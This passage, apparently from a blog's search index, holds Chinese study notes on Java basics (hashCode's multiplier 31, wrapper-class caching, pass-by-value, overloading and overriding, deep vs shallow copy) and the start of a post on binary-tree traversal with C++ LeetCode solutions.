<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) {</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        }</span><br><span class="line">        hash = h;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>在《Effective Java》第 42 页就有对 hashCode 为什么采用 31 做了说明：之所以使用 31， 是因为他是一个奇素数。如果乘数是偶数，并且乘法溢出的话，信息就会丢失，因为与2相乘等价于移位运算（低位补0）。使用素数的好处并不很明显，但是习惯上使用素数来计算散列结果。 31 有个很好的性能，即用移位和减法来代替乘法，可以得到更好的性能： 31 * i == (i &lt;&lt; 5）- i， 现代的 VM 可以自动完成这种优化。这个公式可以很简单的推导出来。<br>31可以由31 * i ==  (i &lt;&lt; 5) - i来表示，现在很多虚拟机里面都有做相关优化，使用31的原因可能是为了更好的分配hash地址，并且31只占用5bits！在java乘法中如果数字相乘过大会导致溢出的问题，从而导致数据的丢失，而31则是素数（质数）而且不是很长的数字，最终它被选择为相乘的系数的原因。</p></blockquote><h2 id="Java中的几种基本数据类型"><a href="#Java中的几种基本数据类型" class="headerlink" title="Java中的几种基本数据类型"></a>Java中的几种基本数据类型</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53914/20200806154245121.png" alt="在这里插入图片描述"><br>注意：</p><ul><li>Java 里使用 long 类型的数据一定要在数值后面加上 L，否则将作为整型解析：</li><li>char a = ‘h’char :单引号，String a = “hello” :双引号</li></ul><p>Java 基本类型的包装类的大部分都实现了常量池技术，即 Byte,Short,Integer,Long,Character,Boolean；前面 4 种包装类默认创建了数值[-128，127] 的相应类型的缓存数据，Character创建了数值在[0,127]范围的缓存数据，Boolean 直接返回True Or False。如果超出对应范围仍然会去创建新的对象。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Boolean <span class="title function_">valueOf</span><span class="params">(<span class="type">boolean</span> b)</span> {</span><br><span class="line">    <span class="keyword">return</span> (b ? TRUE : FALSE);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CharacterCache</span> {         </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">CharacterCache</span><span class="params">()</span>{}</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Character cache[] = <span class="keyword">new</span> <span class="title class_">Character</span>[<span class="number">127</span> + <span class="number">1</span>];          </span><br><span class="line">    <span class="keyword">static</span> {             </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; cache.length; i++)                 </span><br><span class="line">            cache[i] = <span class="keyword">new</span> <span class="title class_">Character</span>((<span class="type">char</span>)i);         </span><br><span class="line">    }   </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*此方法将始终缓存-128 到 127（包括端点）范围内的值，并可以缓存此范围之外的其他值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer <span class="title function_">valueOf</span><span class="params">(<span class="type">int</span> i)</span> {</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)</span><br><span class="line">            <span class="keyword">return</span> IntegerCache.cache[i + (-IntegerCache.low)];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(i);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><blockquote><p>常量池是为了避免频繁的创建和销毁对象而影响系统性能，其实现了对象的共享。<br>例如字符串常量池，在编译阶段就把所有的字符串文字放到一个常量池中。<br>（1）节省内存空间：常量池中所有相同的字符串常量被合并，只占用一个空间。<br>（2）节省运行时间：比较字符串时，==比equals()快。对于两个引用变量，只用==判断引用是否相等，也就可以判断实际值是否相等。 </p></blockquote><blockquote><p>为啥把缓存设置为[-128，127]区间？<br>1.技术规范。JLS7 5.1.7：If the value p being boxed is an integer literal of type int between -128 and 127 inclusive (§3.10.1), or the boolean literal true or false (§3.10.3), or a character literal between ‘\u0000’ and ‘\u007f’ inclusive (§3.10.4), then let a and b be the results of any two boxing conversions of p . It is always the case that a == b .<br>2.性能和资源之间的权衡（当然也可以调整缓存的正向最大值，自己看 IntegerCache 类的实现）。</p><p><strong>如果超出了范围，会从堆区new一个Integer对象来存放值。</strong></p></blockquote><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">a1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">12</span>);</span><br><span class="line">     <span class="type">Integer</span> <span class="variable">a2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">12</span>);</span><br><span class="line">     <span class="type">Integer</span> <span class="variable">b1</span> <span class="operator">=</span> -<span class="number">129</span>;</span><br><span class="line">     <span class="type">Integer</span> <span class="variable">b2</span> <span class="operator">=</span> -<span class="number">129</span>;</span><br><span class="line">     <span class="type">Integer</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">     <span class="type">Integer</span> <span class="variable">c2</span> <span class="operator">=</span> -<span class="number">128</span>;</span><br><span class="line">     System.out.println(a1 == a2);   <span class="comment">//false</span></span><br><span class="line">     System.out.println(b1==b2);     <span class="comment">//false </span></span><br><span class="line">     System.out.println(c1 == c2);   <span class="comment">//false</span></span><br></pre></td></tr></tbody></table></figure><p><strong>两种浮点数类型的包装类 Float,Double 并没有实现常量池技术。</strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">33</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">33</span>;</span><br><span class="line">System.out.println(i1 == i2);<span class="comment">// 输出 true</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i11</span> <span class="operator">=</span> <span class="number">333</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">i22</span> <span class="operator">=</span> <span class="number">333</span>;</span><br><span class="line">System.out.println(i11 == i22);<span class="comment">// 输出 false</span></span><br><span class="line"><span class="type">Double</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">1.2</span>;</span><br><span class="line"><span class="type">Double</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">1.2</span>;</span><br><span class="line">System.out.println(i3 == i4);<span class="comment">// 输出 false</span></span><br></pre></td></tr></tbody></table></figure><h2 id="方法（函数）"><a href="#方法（函数）" class="headerlink" title="方法（函数）"></a>方法（函数）</h2><p>Java 程序设计语言总是采用按值调用。也就是说，方法得到的是所有参数值的一个拷贝，也就是说，方法不能修改传递给它的任何参数变量的内容。<br>在 swap 方法中，a、b 的值进行交换，并不会影响到 num1、num2。因为，a、b 中的值，只是从 num1、num2 的复制过来的。也就是说，a、b 相当于 num1、num2 的副本，副本的内容无论怎么修改，都不会影响到原件本身。</p><p>而对象引用作为参数就不一样</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">    <span class="type">int</span>[] arr = { <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> };</span><br><span class="line">    System.out.println(arr[<span class="number">0</span>]);</span><br><span class="line">    change(arr);</span><br><span class="line">    System.out.println(arr[<span class="number">0</span>]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span>[] array)</span> {</span><br><span class="line">    <span class="comment">// 将数组的第一个元素变为0</span></span><br><span class="line">    array[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>结果：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></tbody></table></figure><p>array 被初始化 arr 的拷贝也就是一个对象的引用，也就是说 array 和 arr 指向的是同一个数组对象。 因此，外部对引用对象的改变会反映到所对应的对象上。</p><p>我们已经看到，实现一个改变对象参数状态的方法并不是一件难事。理由很简单，方法得到的是对象引用的拷贝，对象引用及其他的拷贝同时引用同一个对象。</p><p>很多程序设计语言（特别是，C++和 Pascal)提供了两种参数传递的方式：值调用和引用调用。有些程序员认为 Java 程序设计语言对对象采用的是引用调用，实际上，这种理解是不对的。由于这种误解具有一定的普遍性，所以下面给出一个反例来详细地阐述一下这个问题。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">"小张"</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">"小李"</span>);</span><br><span class="line">        Test.swap(s1, s2);</span><br><span class="line">        System.out.println(<span class="string">"s1:"</span> + s1.getName());</span><br><span class="line">        System.out.println(<span class="string">"s2:"</span> + s2.getName());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(Student x, Student y)</span> {</span><br><span class="line">        <span class="type">Student</span> <span class="variable">temp</span> <span class="operator">=</span> x;</span><br><span class="line">        x = y;</span><br><span class="line">        y = temp;</span><br><span class="line">        System.out.println(<span class="string">"x:"</span> + x.getName());</span><br><span class="line">        System.out.println(<span class="string">"y:"</span> + y.getName());</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>结果：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x:小李</span><br><span class="line">y:小张</span><br><span class="line">s1:小张</span><br><span class="line">s2:小李</span><br></pre></td></tr></tbody></table></figure><p>解析：</p><p>交换之前：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53914/20200806155803123.png" alt="在这里插入图片描述"></p><p>交换之后：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53914/20200806155808662.png" alt="在这里插入图片描述"></p><p>通过上面两张图可以很清晰的看出： 方法并没有改变存储在变量 s1 和 s2 中的对象引用。swap 方法的参数 x 和 y 被初始化为两个对象引用的拷贝，这个方法交换的是这两个拷贝</p><p><strong>总结</strong></p><p>Java 程序设计语言对对象采用的不是引用调用，实际上，对象引用是按 值传递的。</p><p>下面再总结一下 Java 中方法参数的使用情况：</p><ul><li>一个方法不能修改一个基本数据类型的参数（即数值型或布尔型）。</li><li>一个方法可以改变一个对象参数的状态。</li><li>一个方法不能让对象参数引用一个新的对象。</li></ul><p><strong>参考：</strong></p><p>《Java 核心技术卷 Ⅰ》基础知识第十版第四章 4.5 小节</p><h2 id="重载和重写"><a href="#重载和重写" class="headerlink" title="重载和重写"></a>重载和重写</h2><p>重载就是同样的一个方法能够根据输入数据的不同，做出不同的处理</p><p>重写就是当子类继承自父类的相同方法，输入数据一样，但要做出有别于父类的响应时，你就要覆盖父类方法<br>《Java 核心技术》中是这么说的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53914/202008061601321.png" alt="在这里插入图片描述"></p><p><strong>综上</strong>：重载就是同一个类中多个同名方法根据不同的传参来执行不同的逻辑处理。</p><p>重写发生在运行期，是子类对父类的允许访问的方法的实现过程进行重新编写。</p><ul><li>返回值类型、方法名、参数列表必须相同，抛出的异常范围小于等于父类，访问修饰符范围大于等于父类。</li><li>如果父类方法访问修饰符为 private/final/static 则子类就不能重写该方法，但是被 static 修饰的方法能够被再次声明。</li><li>构造方法无法被重写</li></ul><p><strong>综上</strong>：重写就是子类对父类方法的重新改造，外部样子不能改变，内部逻辑可以改变</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53914/20200806160323274.png" alt="在这里插入图片描述"></p><h2 id="深拷贝-vs-浅拷贝"><a href="#深拷贝-vs-浅拷贝" class="headerlink" title="深拷贝 vs 浅拷贝"></a>深拷贝 vs 浅拷贝</h2><p>浅拷贝：对基本数据类型进行值传递，对引用数据类型进行引用传递般的拷贝，此为浅拷贝。<br>深拷贝：对基本数据类型进行值传递，对引用数据类型，创建一个新的对象，并复制其内容，此为深拷贝。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53914/20200806160355775.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> java </tag>
        
            
            
        <tag> 基础 </tag>
        
            
            
        <tag> jvm </tag>
        
            
            
        <tag> 泛型 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>算法与数据结构学习笔记：二叉树</title>
      
      
      <link href="/cn/posts/49261/"/>
      
      
      <url>/cn/posts/49261/</url>
      
      
        
      <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h3><p>前序遍历：先访问根节点，再前序遍历左子树，再前序遍历右子树 中序遍历：先中序遍历左子树，再访问根节点，再中序遍历右子树 后序遍历：先后序遍历左子树，再后序遍历右子树，再访问根节点</p><p>注意点</p><ul><li>以根访问顺序决定是什么遍历</li><li>左子树都是优先右子树</li></ul><h4 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h4><p>例题：<a href="https://leetcode-cn.com/problems/binary-tree-preorder-traversal/">https://leetcode-cn.com/problems/binary-tree-preorder-traversal/</a></p><h5 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line"><span class="comment">// 先访问根再访问左右</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">preorderTraversal</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">preorderTraversal</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="非递归"><a href="#非递归" class="headerlink" title="非递归"></a>非递归</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">       vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        TreeNode *cur=root;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>||!st.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>)</span><br><span class="line">            {</span><br><span class="line">                ans.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                st.<span class="built_in">push</span>(cur);</span><br><span class="line">                cur=cur-&gt;left;</span><br><span class="line">            }</span><br><span class="line">            cur=st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            cur=cur-&gt;right;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">       </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>也可以这么写</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">       vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!st.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">auto</span> cur=st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            ans.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;right)</span><br><span class="line">                st.<span class="built_in">push</span>(cur-&gt;right);</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;left)</span><br><span class="line">                st.<span class="built_in">push</span>(cur-&gt;left);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;       </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><p>例题：<a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/">https://leetcode-cn.com/problems/binary-tree-inorder-traversal/</a></p><h5 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:   </span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;ans;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;       </span><br><span class="line">        <span class="built_in">inorderTraversal</span>(root-&gt;left);</span><br><span class="line">        ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">       </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="后序遍历："><a href="#后序遍历：" class="headerlink" title="后序遍历："></a>后序遍历：</h4><p>例题：<a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/">https://leetcode-cn.com/problems/binary-tree-postorder-traversal/</a></p><h5 id="递归："><a href="#递归：" class="headerlink" title="递归："></a>递归：</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        <span class="built_in">postorderTraversal</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">postorderTraversal</span>(root-&gt;right);</span><br><span class="line">        ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="分治法应用"><a href="#分治法应用" class="headerlink" title="分治法应用"></a>分治法应用</h3><p>先分别处理局部，再合并结果</p><p>适用场景</p><ul><li>快速排序</li><li>归并排序</li><li>二叉树相关问题</li></ul><p>分治法模板</p><ul><li>递归返回条件</li><li>分段处理</li><li>合并结果</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 